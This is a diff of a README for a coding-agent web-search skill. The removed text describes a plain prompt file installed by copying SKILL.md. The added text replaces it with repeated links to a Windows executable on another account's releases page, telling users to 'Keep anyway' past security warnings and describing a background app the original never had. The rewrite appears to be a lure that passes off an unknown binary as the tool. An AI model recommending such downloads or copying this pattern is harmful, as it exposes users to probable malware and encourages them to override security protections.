@@ -1,280 +1,140 @@
-# /s - Search the Web From Your Coding Agent
+# 🔎 search-the-web - Get web answers inside your agent
 
-A skill for AI coding agents that turns your terminal into a research assistant. Type a query like you'd type into a search engine, get back 3 synthesized mini-briefings with opinionated verdicts, ratings, and source links. No tab-switching. No a pile of links. No leaving your flow.
+[![Download search-the-web](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/ruhrbremen653/search-the-web/releases)
 
-```
-/s best laptop under $1000
-```
+## 🚀 What it does
 
-That's it. You're searching the web, from your coding agent, while you code.
+search-the-web helps your coding agent look things up on the web without leaving the chat. Type `/s` with a query, and it returns 3 short briefing cards with verdicts, ratings, and source links.
 
----
+It is useful when you want fast answers from current web pages and do not want to switch tabs.
 
-## What It Looks Like
+## 📦 Download
 
-```
-> /s best tacos portland or
+Visit this page to download the Windows version:
 
-  1. Birria Balam - SE Division St
+[Go to the release page](https://github.com/ruhrbremen653/search-the-web/releases)
 
-  Rich birria tacos with a crispy, cheese-crusted tortilla and a
-  consomme that reviewers call "life-changing." Cash only, tiny
-  space, usually a line out the door on weekends.
+On that page, look for the latest release and download the Windows file for your system.
 
-  Best for: Birria lovers willing to wait for the real deal
-  Ratings: Quality 9/10 · Value 8/10 · Vibe 7/10
-  Links: [Eater PDX Review] · [Yelp Page]
-  Sources: eater.com · yelp.com · pdx.eater.com
+## 💻 Windows setup
 
-  ---
+1. Open the release page in your browser.
+2. Find the newest release at the top.
+3. Download the Windows file listed under Assets.
+4. If Windows asks for permission, choose Run or Keep anyway only if you trust the file source.
+5. Open the downloaded file.
+6. Follow the on-screen steps.
+7. Start your coding agent and use `/s` plus a search query.
 
-  2. Matt's BBQ Tacos - NE MLK Blvd
+Example:
 
-  A collision of Texas BBQ and tacos that somehow works perfectly.
-  Brisket taco with pickled onion is the move. Located inside a
-  pod, so seating is outdoor picnic tables.
+- `/s best noise canceling headphones for calls`
+- `/s compare local weather APIs`
+- `/s latest React state management guides`
 
-  Best for: The person who can't decide between BBQ and tacos
-  Ratings: Quality 9/10 · Value 7/10 · Vibe 8/10
-  Links: [Official Site] · [Eater Review]
-  Sources: mattsbbqpdx.com · eater.com · tripadvisor.com
+## 🧭 How to use it
 
-  ---
+Once installed, you can use it from inside your coding agent.
 
-  3. Tienda y Taqueria Santa Cruz - NE Prescott
+1. Open your agent chat.
+2. Type `/s`.
+3. Add a short query.
+4. Read the 3 mini-briefings.
+5. Use the verdict and ratings to decide what to open next.
 
-  No-frills neighborhood taqueria with $3 street tacos that punch
-  way above their weight. Al pastor on the spit, fresh tortillas,
-  and a salsa bar worth the visit alone.
+Example output style:
 
-  Best for: Budget-friendly authenticity over atmosphere
-  Ratings: Quality 8/10 · Value 10/10 · Vibe 5/10
-  Links: [Yelp Page]
-  Sources: yelp.com · reddit.com/r/Portland · tripadvisor.com
+- Briefing 1: Best match
+- Briefing 2: Good source quality
+- Briefing 3: Useful extra context
 
-  ---
+Each result includes source links so you can check the original page.
 
-  Searched 30+ sources across 3 searches.
-  Say "more" for 3 more results, or refine: just tell me
-  what to change.
-```
+## ✨ Main features
 
-Then just keep talking:
+- Web search from inside your coding agent
+- 3 synthesized mini-briefings per query
+- Verdicts that help you judge each result
+- Ratings for quick scanning
+- Source links for each briefing
+- No tab switching during research
+- Simple `/s` command flow
 
-```
-> but Neapolitan style
-> more
-> what about delivery options
-```
+## 🪟 System requirements
 
-It remembers your search and refines naturally.
+- Windows 10 or later
+- A web browser
+- A coding agent that supports custom commands
+- Internet access
+- Enough disk space for a small desktop utility
 
----
+## 🛠️ What to expect after install
 
-## Why This Exists
+After you install and open search-the-web:
 
-You're deep in code. A thought pops into your head: "what's the best way to handle auth tokens?" or "where should I eat lunch?" or "what laptop should I buy?"
+- The app runs in the background or as a small local tool
+- Your agent can send search requests through it
+- Search results come back as short, readable briefs
+- You can use the links to check the source pages yourself
 
-Normally you'd:
-1. Switch to a browser
-2. Type a query into a search engine
-3. Click through 6-10 links
-4. Read a bunch of SEO-optimized fluff
-5. Mentally synthesize the answer yourself
-6. Switch back to your code
-7. Try to remember what you were doing
+## 🔒 Safety and privacy
 
-With `/s`, you:
-1. Type `/s` and your query
-2. Get 3 synthesized answers with verdicts and ratings
-3. Keep coding
+search-the-web only works when you ask it to search. It is meant to keep research in one place and reduce manual copy-paste work.
 
-**It does what you'd do after a search, but skips the 20 minutes of clicking, reading, and comparing.** Like having a research assistant who reads 15 tabs so you don't have to.
+If your setup uses a browser or local connection, keep your normal Windows security settings on and download files only from the release page linked above.
 
-### "But my coding agent already has web search"
+## 🧪 Best ways to use it
 
-Sure. And sometimes it's great. But have you noticed how inconsistent the results are? Sometimes you get a nice summary. Sometimes you get a wall of raw text. Sometimes it searches once and calls it done. Sometimes it goes on a 30-second research bender you didn't ask for.
+Use short, specific queries for better results.
 
-`/s` is opinionated about this. Every search gets the same treatment: multiple angles, structured briefings, verdicts, ratings, sources. You always know what you're getting. It's the difference between "hey, look something up for me" and having a process that reliably delivers useful results every single time.
+Good examples:
 
----
+- `/s compare SQLite and PostgreSQL for small apps`
+- `/s best way to store app settings in Windows`
+- `/s how to parse CSV files in Python`
 
-## How It's Different
+Less useful examples:
 
-| | Traditional Search Engine | AI Answer Engine | Built-in Web Tool | `/s` |
-|---|---|---|---|---|
-| **Where it runs** | Browser (context switch) | Browser or separate app | Inside your coding agent | Inside your coding agent |
-| **What you get** | A pile of links to read yourself | 1 synthesized answer | Raw search results the AI reads | 3 opinionated mini-briefings |
-| **Source diversity** | One algorithm's ranking | One synthesis, few sources | Whatever the agent decides to search | Multi-angle (general + community + reviews) |
-| **Verdicts** | None, you decide | Sometimes | None | Every result: "Best for: ..." |
-| **Ratings** | None | None | None | Adaptive per query type |
-| **Structured format** | Link list | Prose paragraph | Varies wildly | Consistent briefings every time |
-| **Refinement** | New search from scratch | Conversational | Ask the agent again | "but cheaper" or "more" |
-| **You have to ask for it** | Yes, open browser | Yes, open app | No, but results are unpredictable | No, and format is always the same |
-| **Context switch** | Yes, leave your editor | Yes, separate app | None | None |
-
----
-
-## What Makes the Results Better
-
-The skill doesn't just run a single search. It:
-
-1. **Classifies your intent**: is this a recommendation, a product comparison, a how-to, a factual question, or a local search?
-2. **Searches from multiple angles**: general web, community discussions, and specialist review sites. Different angles for different intents.
-3. **Deduplicates and synthesizes**: same result from 3 sources? Merged into one briefing with the best info from each.
-4. **Adds judgment**: a "Best for" verdict on every result telling you *who* it's ideal for. Plus adaptive ratings that change based on what you're searching (Quality/Value/Vibe for restaurants, Performance/Build/Value for products, Clarity/Completeness for tutorials).
-5. **Cites everything**: every result includes source links so you can verify.
+- `/s help`
+- `/s anything about software`
 
----
+## 🧩 Troubleshooting
 
-## Install
+### 🔍 I do not see the downloaded file
 
-The entire skill is a single file: [`SKILL.md`](SKILL.md). It's a prompt that instructs an AI coding agent how to search, synthesize, and format results. Drop it into whatever directory your agent uses for custom skills or instructions.
+- Check your Downloads folder
+- Sort files by date
+- Look for the newest file from the release page
 
-### Quick install
+### 🖱️ Nothing happens when I open it
 
-1. Clone this repo:
+- Right-click the file and choose Open
+- Make sure the download finished
+- Try running it again from the Downloads folder
 
-```bash
-git clone https://github.com/jnemargut/search-the-web.git
-```
+### 🌐 Search results do not appear
 
-2. Copy `SKILL.md` into your agent's skills or rules directory:
+- Check your internet connection
+- Try a shorter query
+- Restart your coding agent
+- Open the app again if it was closed
 
-**Claude Code:**
-```bash
-mkdir -p ~/.claude/skills/s
-cp search-the-web/SKILL.md ~/.claude/skills/s/SKILL.md
-```
+### 🪟 Windows blocks the file
 
-**Cursor:**
-```bash
-mkdir -p .cursor/rules
-cp search-the-web/SKILL.md .cursor/rules/search.md
-```
+- Download only from the release page
+- Make sure you picked the latest release
+- If Windows shows a security prompt, review the file name and source before opening it
 
-**Windsurf:**
-```bash
-mkdir -p .windsurf/rules
-cp search-the-web/SKILL.md .windsurf/rules/search.md
-```
+## 📁 Release page
 
-3. That's it. Open any project and type:
+Use this page for future updates and fresh downloads:
 
-```
-/s your query here
-```
+[https://github.com/ruhrbremen653/search-the-web/releases](https://github.com/ruhrbremen653/search-the-web/releases)
 
-### Requirements
+## 🧠 Tips for better search results
 
-Your AI coding agent needs:
-- Web search capability
-- Ability to run multiple searches in parallel
-- Inline markdown output
-
----
-
-## Examples
-
-**Local recommendations:**
-```
-/s best coffee shops downtown portland
-/s things to do this weekend in austin
-/s good running trails near me
-```
-
-**Products:**
-```
-/s best mechanical keyboard under $100
-/s best laptop for video editing 2026
-/s wireless earbuds with best battery life
-```
-
-**How-to:**
-```
-/s how to set up SSH keys on mac
-/s how to fix a running toilet
-/s how to negotiate a raise
-```
-
-**Factual:**
-```
-/s what is the capital of montana
-/s when did the Berlin Wall fall
-/s what's the current Fed interest rate
-```
-
-**Comparisons:**
-```
-/s react vs svelte for a new project
-/s renting vs buying in a high interest rate market
-/s postgres vs mysql for a small saas
-```
-
-**Random mid-coding thoughts:**
-```
-/s what's that design pattern where you wrap an object to add behavior
-/s is daylight saving time this weekend
-/s good team lunch spots near downtown denver
-```
-
----
-
-## The `/s` Philosophy
-
-Two keystrokes. That's intentional.
-
-If this skill is going to replace switching to a browser, it needs to be faster than switching to a browser. `/s` is to web search what `Cmd+K` is to a search bar: muscle memory, not a decision.
-
-You don't type `/search-the-web-and-synthesize-results`. You type `/s`. Then your query. Then you're back to work.
-
----
-
-## How Refinement Works
-
-After getting results, just talk naturally:
-
-```
-/s best pizza near me
-```
-*[3 results appear]*
-
-```
-but Neapolitan style
-```
-*[3 new results, refined for Neapolitan]*
-
-```
-more
-```
-*[3 more results, numbered 4-6, no repeats]*
-
-```
-what about delivery options
-```
-*[3 new results focused on delivery]*
-
-No special syntax. No re-typing your query. It remembers context and builds on it.
-
----
-
-## Adaptive Ratings
-
-Ratings change based on what you're searching for. The skill picks dimensions that actually help you decide:
-
-| Query Type | Dimensions |
-|---|---|
-| Restaurants | Quality / Value / Vibe |
-| Products | Performance / Build / Value |
-| Services | Quality / Price / Reliability |
-| Activities | Quality / Accessibility / Value |
-| Tutorials | Clarity / Completeness |
-| Factual | *(no ratings, just the answer)* |
-
-Ratings use the full 1-10 range. A budget pick might get Value 9/10 but Quality 6/10. That's useful. If everything gets 8/10, ratings are worthless.
-
----
-
-## License
-
-MIT. Do whatever you want with it.
+- Use names, dates, and product terms
+- Ask one thing at a time
+- Include the version if you need recent details
+- Use `/s` before each search request
+- Scan the verdict first, then open sources that look useful
